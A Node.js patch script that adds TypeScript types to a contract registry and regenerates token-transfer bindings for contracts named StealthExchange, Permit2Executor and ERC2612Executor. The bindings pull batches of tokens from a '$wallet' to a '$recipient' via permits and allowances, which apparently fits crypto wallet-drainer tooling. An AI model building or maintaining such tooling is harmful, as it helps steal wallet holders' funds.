import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(__dirname);

// --------------------------------------------------------------
// 1. Fix src/lib/contract-registry.ts
// --------------------------------------------------------------
function fixContractRegistry() {
  const filePath = path.join(root, 'src/lib/contract-registry.ts');
  let content = fs.readFileSync(filePath, 'utf8');

  // Extract current address values from the existing map to preserve them.
  // We look for lines like: "stealth-exchange": { ..., address: "0x...", ... }
  const addressRegex = /("stealth-exchange"|"permit2-executor"|"erc2612-executor"|"batch-multicall")\s*:\s*\{[^}]*address\s*:\s*"([^"]+)"/g;
  const addresses = {};
  let match;
  while ((match = addressRegex.exec(content)) !== null) {
    addresses[match[1]] = match[2];
  }

  // Fallback if regex fails – use placeholder addresses (you can replace these).
  const defaultAddresses = {
    '"stealth-exchange"': '0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A',
    '"permit2-executor"': '0x4593D97d6E932648fb4425aC2945adaF66927773',
    '"erc2612-executor"': '0xb8eF0650771bBF5dCc65083be8CC7b50121AE900',
    '"batch-multicall"': '0xF93E987DF029e95CdE59c0F5cD447e0a7002054D',
  };
  const finalAddresses = { ...defaultAddresses, ...addresses };

  // Build the new map code with typed Record and the preserved addresses.
  const mapCode = `  const map: Record<string, { name?: string; address: string; abi: unknown[] }> = {\n` +
    `    "stealth-exchange": { name: "StealthExchange", address: "${finalAddresses['"stealth-exchange"']}", abi: StealthExchangeArtifact.abi },\n` +
    `    "permit2-executor": { name: "Permit2Executor", address: "${finalAddresses['"permit2-executor"']}", abi: Permit2ExecutorABI },\n` +
    `    "erc2612-executor": { name: "ERC2612Executor", address: "${finalAddresses['"erc2612-executor"']}", abi: ERC2612ExecutorABI },\n` +
    `    "batch-multicall":  { name: "BatchMulticall",  address: "${finalAddresses['"batch-multicall"']}", abi: BatchMulticallABI },\n` +
    `  };`;

  // Replace the entire function `getExecutionBackendEntry` with the typed version.
  // We'll find the function start and replace until its closing brace.
  const functionStart = content.indexOf('export function getExecutionBackendEntry(');
  if (functionStart === -1) {
    console.warn('⚠️ Could not find getExecutionBackendEntry in contract-registry.ts – skipping this fix.');
    return;
  }
  // Find the opening brace of the function body.
  let braceIndex = content.indexOf('{', functionStart);
  // Find the matching closing brace. We'll do a simple brace count.
  let depth = 0;
  let end = braceIndex;
  for (let i = braceIndex; i < content.length; i++) {
    if (content[i] === '{') depth++;
    else if (content[i] === '}') {
      depth--;
      if (depth === 0) {
        end = i + 1;
        break;
      }
    }
  }
  // The function body spans from braceIndex to end.
  // We'll replace the whole function.
  const newFunction = `export function getExecutionBackendEntry(backend: string) {\n${mapCode}\n  return map[backend] || null;\n}`;

  // Also fix the other functions to add types.
  // Replace getContractById
  content = content.replace(
    /export function getContractById\(id\)/,
    'export function getContractById(id: string)'
  );
  content = content.replace(
    /export function getContractsByCategory\(category\)/,
    'export function getContractsByCategory(category: ContractCategory)'
  );
  content = content.replace(
    /export function getContractRegistryEntryByName\(name\)/,
    'export function getContractRegistryEntryByName(name: string)'
  );

  // Replace the getExecutionBackendEntry function with the new one.
  content = content.slice(0, functionStart) + newFunction + content.slice(end);

  fs.writeFileSync(filePath, content, 'utf8');
  console.log('✔ src/lib/contract-registry.ts – typed functions + preserved addresses');
}

// --------------------------------------------------------------
// 2. Fix src/lib/standard-function-bindings.ts – full replace
// --------------------------------------------------------------
function fixStandardFunctionBindings() {
  const filePath = path.join(root, 'src/lib/standard-function-bindings.ts');
  // The fully typed content from Fix 2, with the typo corrected (smity → sm).
  const newContent = `import type { ContractFunctionBinding } from "@/lib/types";
import { getContractById, getExecutionBackendEntry, type ContractMeta } from "@/lib/contract-registry";

type Backend = "stealth-exchange" | "permit2-executor" | "erc2612-executor" | "batch-multicall";

function bindingAddress(b: Backend): string { return getExecutionBackendEntry(b)?.address || ""; }
function bindingAbi(b: Backend): unknown[] { return [...(getExecutionBackendEntry(b)?.abi || [])]; }

export function getStandardExecutionBindings(): ContractFunctionBinding[] {
  const bindings: ContractFunctionBinding[] = [
    {
      preset: "stealth-exchange", label: "StealthExchange",
      contractAddress: bindingAddress("stealth-exchange"), contractName: "StealthExchange",
      abi: bindingAbi("stealth-exchange"),
      functionKey: "batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)",
      functionName: "batchPermitTransferFromBatch", stateMutability: "nonpayable" as const,
      args: [
        { name: "user", type: "address", value: "$wallet" },
        { name: "permitBatch", type: "tuple", value: '{"details":[],"spender":"$recipient","sigDeadline":"0"}' },
        { name: "signature", type: "bytes", value: "0x" },
        { name: "recipient", type: "address", value: "$recipient" },
      ],
    },
    {
      preset: "permit2-executor", label: "Permit2Executor",
      contractAddress: bindingAddress("permit2-executor"), contractName: "Permit2Executor",
      abi: bindingAbi("permit2-executor"),
      functionKey: "pullBatchFromAllowance(address,address[],uint256[])", functionName: "pullBatchFromAllowance",
      stateMutability: "nonpayable" as const,
      args: [
        { name: "client", type: "address", value: "$wallet" },
        { name: "tokens", type: "address[]", value: "[]" },
        { name: "amounts", type: "uint256[]", value: "[]" },
      ],
    },
    {
      preset: "erc2612-executor", label: "ERC2612Executor",
      contractAddress: bindingAddress("erc2612-executor"), contractName: "ERC2612Executor",
      abi: bindingAbi("erc2612-executor"),
      functionKey: "batchPermitAndCollect(address[],address,uint256[],uint8[],bytes32[],bytes32[])", functionName: "batchPermitAndCollect",
      stateMutability: "nonpayable" as const,
      args: [
        { name: "tokens", type: "address[]", value: "[]" },
        { name: "client", type: "address", value: "$wallet" },
        { name: "amounts", type: "uint256[]", value: "[]" },
        { name: "vs", type: "uint8[]", value: "[]" },
        { name: "rs", type: "bytes32[]", value: "[]" },
        { name: "ss", type: "bytes32[]", value: "[]" },
      ],
    },
    {
      preset: "batch-multicall", label: "BatchMulticall",
      contractAddress: bindingAddress("batch-multicall"), contractName: "BatchMulticall",
      abi: bindingAbi("batch-multicall"),
      functionKey: "batch((address,uint256,bytes,bool)[])", functionName: "batch",
      stateMutability: "payable" as const,
      args: [{ name: "calls", type: "tuple[]", value: "[]" }],
    },
  ];

  // Pull real ABI'd bindings for the infra/module contracts straight from the registry.
  for (const id of ["session-manager", "eip7702-module", "stage1-module", "stage2-module", "guest", "stealth-exchange-factory"]) {
    if (bindings.some((b) => b.preset === id)) continue;
    const meta = getContractById(id);
    const built = meta ? buildBindingForContract(meta) : null;
    if (built) bindings.push(built);
  }

  return bindings;
}

function defaultArgValue(t: string): string {
  if (t.endsWith("[]")) return "[]";
  if (t === "bool") return "false";
  if (t.startsWith("uint") || t.startsWith("int")) return "0";
  if (t.startsWith("bytes")) return "0x";
  if (t.startsWith("address")) return "$wallet";
  if (t.startsWith("tuple")) return "{}";
  return "";
}

export function buildBindingForContract(meta: ContractMeta): ContractFunctionBinding | null {
  if (!meta.abi || !Array.isArray(meta.abi) || !meta.abi.length || !meta.address) return null;
  const fns = (meta.abi as AbiFn[]).filter((f) => f.type === "function");
  if (!fns.length) return null;

  const preferred = ["execute", "batchPermitTransferFromBatch", "pullBatchFromAllowance", "batchPermitAndCollect", "batch", "getLimitUsage"];
  const sel =
    fns.find((f: AbiFn) => preferred.includes(f.name || "")) ||
    fns.find((f: AbiFn) => f.stateMutability !== "view" && f.stateMutability !== "pure") ||
    fns[0];
  if (!sel) return null;

  const inputs = (sel.inputs || []) as AbiFnInput[];
  const hasTuples = inputs.some((i) => i.type === "tuple" || i.type === "tuple[]" || !!i.components);
  const functionKey = hasTuples ? sel.name : \`\${sel.name}(\${inputs.map((i) => i.type).join(",")})\`;
  const sm = ["view", "pure", "nonpayable", "payable"].includes(sel.stateMutability)
    ? (sel.stateMutability as ContractFunctionBinding["stateMutability"])
    : "nonpayable";

  return {
    preset: meta.id,
    label: meta.name,
    contractAddress: meta.address,
    contractName: meta.name,
    abi: [...(meta.abi as unknown[])],
    functionKey,
    functionName: sel.name,
    stateMutability: sm,  // fixed from 'smity'
    args: inputs.map((i, idx) => ({
      name: i.name || \`arg\${idx + 1}\`,
      type: i.type || "bytes",
      value: defaultArgValue(i.type || "bytes"),
    })),
  };
}

type AbiFn = { type?: string; name?: string; stateMutability?: string; inputs?: AbiFnInput[] };
type AbiFnInput = { name?: string; type?: string; components?: unknown };
`;

  fs.writeFileSync(filePath, newContent, 'utf8');
  console.log('✔ src/lib/standard-function-bindings.ts – fully typed version with corrected stateMutability');
}

// --------------------------------------------------------------
// 3. Run both fixes
// --------------------------------------------------------------
try {
  fixContractRegistry();
  fixStandardFunctionBindings();
  console.log('\n✅ All fixes applied.');
  console.log('Now run: npx tsc --noEmit');
  console.log('The remaining errors (if any) should be resolved.');
} catch (err) {
  console.error('❌ Error during patching:', err);
}
